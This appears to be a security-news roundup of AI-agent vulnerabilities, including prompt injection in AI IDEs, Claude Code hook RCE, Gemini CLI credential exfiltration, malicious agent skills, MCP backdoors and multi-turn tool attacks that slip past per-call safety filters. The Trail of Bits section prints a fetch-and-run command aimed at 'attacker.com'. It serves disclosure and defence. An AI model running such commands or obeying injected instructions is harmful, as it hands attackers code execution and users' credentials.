## Incidents & Vulnerabilities

### IDEsaster: 30+ CVEs Across AI IDEs via Legitimate Feature Abuse (MaccariTA / Ari Marzouk)

Researcher Ari Marzouk disclosed **IDEsaster**, a vulnerability class affecting every AI IDE tested. The core finding: AI agents can be prompted to abuse legitimate IDE features (workspace config files, JSON schema loading, MCP config paths) to achieve RCE or data exfiltration — no memory corruption required. AWS issued security advisory **AWS-2025-019** in response; 24 CVEs were assigned.

Attack chain: **Prompt Injection → Agent Tools → Base IDE Features**

### Claude Code: RCE via Project Hooks and API Key Exfiltration (Check Point Research)

Check Point Research disclosed two vulnerabilities affecting Claude Code, both patched in **v2.0.65+**:

- **CVE-2025-59536** (CVSS 8.7) — Arbitrary code execution via malicious project `Hooks` configuration. Cloning a crafted repository causes shell commands to execute automatically without user interaction.
- **CVE-2026-21852** (CVSS 5.3) — API key exfiltration via crafted MCP server entries embedded in project configuration files.

Both are supply-chain-style delivery mechanisms: the payload propagates through malicious pull requests, honeypot repositories, or compromised enterprise repos.

- **Status:** Patched in Claude Code v2.0.65+.
- **Affected versions:** All Claude Code versions prior to v2.0.65.
- **Source:** [Check Point Research](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)

### Argument Injection → RCE in AI Agents (Trail of Bits)

Trail of Bits documented that AI agents using allowlists of "safe" shell commands (`find`, `grep`, `git`) without sandboxing are fundamentally vulnerable. Commands like `go test -exec` can invoke arbitrary executables, allowing a prompt instruction such as `go test -exec bash -c 'curl attacker.com | sh'` to achieve RCE via chains of otherwise-approved commands.

A specific Claude Code CVE (**CVE-2025-54795**) and a Cursor advisory (**GHSA-534m-3w6r-8pqr**) were identified in the same research. Trail of Bits concluded allowlist-based defenses are unscalable: thousands of flag combinations cannot be enumerated.

- **Status:** CVEs disclosed; no general architectural fix — sandboxing is the only reliable mitigation.
- **Source:** [Trail of Bits Blog](https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/)

### Gemini CLI: Indirect Prompt Injection and Credential Exfiltration

Inherited from Windsurf/Codeium (originally disclosed May 2025), Google's Gemini CLI remains vulnerable to indirect prompt injection via attacker-controlled web content. A poisoned page manipulates the agent into harvesting credentials and sensitive code, then exfiltrates them via a browser subagent. The **markdown image exfiltration** vector uses `<img>` tags with data-encoded URLs: the browser makes an outbound HTTP request, leaking secrets in server access logs.

- **Status:** Unpatched as of March 2026. Google acknowledged but no patch timeline provided. No CVE assigned.
- **Source:** [CyberSecurityNews](https://cybersecuritynews.com/critical-vulnerabilities-in-github-copilot-gemini-cli-claude/)

### Chrome Extension Hijack of Gemini Live Panel (CVE-2026-0628)

Malicious Chrome extensions with `declarativeNetRequests` permissions could inject JavaScript into the Gemini Live panel — distinct from normal tabs and outside standard extension sandboxing. This enabled access to local files, screenshots, camera, and microphone feeds.

- **Status:** Patched in Chrome 143 (January 2026). Responsibly disclosed October 23, 2025.
- **CVE:** CVE-2026-0628
- **Source:** [Malwarebytes](https://www.malwarebytes.com/blog/news/2026/03/chrome-flaw-let-extensions-hijack-geminis-camera-mic-and-file-access), [Unit 42](https://unit42.paloaltonetworks.com/gemini-live-in-chrome-hijacking/)

## Supply Chain

### "Slopsquatting": Hallucinated Dependency Exploitation at Scale

A USENIX Security 2025-accepted paper (UTSA) analyzed 2.23 million AI-generated code samples and found **440,445 references to non-existent packages**:

- Open-source models (CodeLlama, DeepSeek, WizardCoder, Mistral): ~21.7% hallucination rate
- Commercial models (GPT-4): ~5.2% hallucination rate
- **43% of hallucinated package names repeat consistently across 10 re-runs**, making them pre-registrable
- Sonatype 2026: 28% of LLM-assisted dependency upgrade suggestions were hallucinations
- In 2023, 20–35% of hallucinated names were converted to actual malicious uploads on PyPI/npm

No CVE class; this is an attack vector enabled by model behavior. Mitigations are procedural: lockfiles, registry monitoring, manual dependency review.

- **Source:** [UTSA Today](https://www.utsa.edu/today/2025/04/story/utsa-researchers-investigate-AI-threats.html), [BleepingComputer](https://www.bleepingcomputer.com/news/security/ai-hallucinated-code-dependencies-become-new-supply-chain-risk/)

### OpenClaw / ClawHub "ClawHavoc" Supply Chain Crisis

OpenClaw, a local AI agent framework with a community skills marketplace (ClawHub), experienced a coordinated supply chain attack called **ClawHavoc** within three weeks of its viral launch:

- **824+ confirmed malicious skills** out of 10,700+ (~20% of the ecosystem); Bitdefender reports ~900
- **135,000+ publicly exposed OpenClaw instances** across 82 countries; 50,000+ exploitable via RCE
- Malware delivered: Atomic macOS Stealer (AMOS), Windows keyloggers, credential exfiltration payloads
- **ClawHub ranking manipulation**: an exposed function generated 20,000 fake downloads in minutes, pushing malicious skills to top search results → 3,900 executions across 50 cities in six days
- **BobVonNeumann** agent-to-agent attack: a malicious agent on Moltbook social network promoted malicious skills to other agents via inter-agent trust, harvesting Solana wallet private keys

|---|---|---|---|
| CVE-2026-25253 | CVSS 8.8 | RCE via malicious webpage WebSocket hijack | Patched (v2026.1.29) |
| CVE-2026-25593 | High | Command injection | Patched |

| CVE-2026-25157 | High | Auth bypass | Patched |
| CVE-2026-25475 | High | Path traversal | Patched |
| CVE-2026-26319/26322/26329 | High | Additional RCE / injection variants | Patched |

Microsoft Defender: "OpenClaw should be treated as untrusted code execution with persistent credentials. It is not appropriate to run on a standard personal or enterprise workstation." Cisco released **DefenseClaw** as an open-source defensive tool.

- **Source:** [AdminByRequest](https://www.adminbyrequest.com/en/blogs/openclaw-went-from-viral-ai-agent-to-security-crisis-in-just-three-weeks), [The Hacker News — ClawJacked](https://thehackernews.com/2026/02/clawjacked-flaw-lets-malicious-sites.html), [Trend Micro](https://www.trendmicro.com/en_us/research/26/b/openclaw-skills-used-to-distribute-atomic-macos-stealer.html)

### Postmark MCP npm Package Backdoor

A backdoor was inserted into an npm package used to send transactional email via Postmark in AI automation pipelines. A single malicious line blind-copied every outgoing email to the attacker — capturing password resets, invoices, and internal communications before detection.

- **Status:** Disclosed; package removed from registry.
- **Source:** [Oligo Security](https://www.oligo.security/blog/the-hidden-risks-of-the-npm-supply-chain-attacks-ai-agents)

### Smithery MCP Registry: Path Traversal Leaks Cloud Credentials

A path traversal vulnerability in `smithery.yaml` build configuration (`dockerBuildPath: ".."`) caused the Smithery hosted MCP registry to build Docker images from the builder's home directory. The exploit leaked `~/.docker/config.json` including a Fly.io API token granting control over **3,000+ hosted apps** — most of them MCP servers.

- **Status:** Patched by Smithery; no CVE assigned.
- **Source:** [AuthZed — MCP breach timeline](https://authzed.com/blog/timeline-mcp-breaches)

## Research & Advisories

### MCP Ecosystem: Broad Vulnerability Survey

An academic analysis of 67,057 MCP servers across six public registries found:

- **43%** contain OAuth authentication flaws
- **43%** contain command injection vulnerabilities
- **33%** allow unrestricted outbound network access
- **22%** allow file access outside intended directories
- **~50%** of ~7,000 public servers lack authentication or encryption
- **36.7%** vulnerable to SSRF

### STAC: Sequential Tool Attack Chaining

Researchers introduced **STAC** — multi-turn attacks against tool-enabled agents where each individual tool call passes safety filters, but the sequence collectively achieves a harmful goal. The core exploitable weakness is **contextual blindness**: existing safety mechanisms evaluate each tool call in isolation without tracking cross-turn intent. No CVE class; architectural mitigation requires session-level intent modeling.
